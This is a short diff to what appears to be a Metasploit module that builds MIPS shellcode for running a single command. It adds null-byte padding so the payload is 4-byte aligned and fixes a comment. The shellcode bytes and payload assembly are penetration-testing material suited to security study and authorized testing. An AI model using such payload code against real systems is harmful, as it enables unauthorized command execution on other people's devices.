@@ -62,12 +62,18 @@ module Metasploit3
       "\xec\xff\xa0\xaf" + # sw zero,-20(sp)
       "\xe8\xff\xa5\x27" + # addiu a1,sp,-24
       "\xab\x0f\x02\x24" + # li v0,4011
-      "\x0c\x01\x01\x01"   # + syscall 0x40404
+      "\x0c\x01\x01\x01"   # syscall 0x40404
 
     #
     # Constructs the payload
     #
-    return super + shellcode + command_string + "\x00"
+
+    shellcode = shellcode + command_string + "\x00"
+
+    # we need to align our shellcode to 4 bytes
+    (shellcode = shellcode + "\x00") while shellcode.length%4 != 0
+
+    return super + shellcode
 
   end
 
